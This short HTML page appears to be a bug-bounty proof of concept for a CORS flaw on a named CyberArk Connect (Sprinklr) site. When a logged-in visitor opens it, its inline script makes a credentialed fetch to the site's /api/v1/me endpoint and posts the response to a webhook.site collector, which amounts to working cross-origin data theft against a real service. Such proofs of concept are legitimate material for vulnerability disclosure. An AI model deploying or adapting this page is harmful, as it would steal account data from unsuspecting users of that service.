<body>
<h2>Sprinklr CyberArk Connect CORS Proof‑of‑Concept</h2>
<p>If you are logged into <code>https://cyberarkconnect.sprinklr.com</code>
in the same browser, the request below will include your <code>connect.sid</code>
cookie and the API response will be displayed.</p>

<p><strong>Status:</strong> <span id="status">loading…</span></p>
<pre id="output"></pre>

<script>
(async () => {
  /* 1. Make a credentialed request that will succeed for any logged‑in user */
  const resp = await fetch(
    "https://cyberarkconnect.sprinklr.com/api/v1/me",
    { credentials: "include" }    // sends victim cookies if they’re logged in
  );

  /* 2. Send the whole body to your collector so the triager sees the leak */
  const body = await resp.text();
  await fetch("https://webhook.site/<YOUR-ID>", {
    method: "POST",
    mode:   "no-cors",
    body
  });

  document.body.innerHTML =
    "<h1>Done — check webhook.site for exfiltrated JSON (status " +
    resp.status + ")</h1>";
})();
</script>
</body>
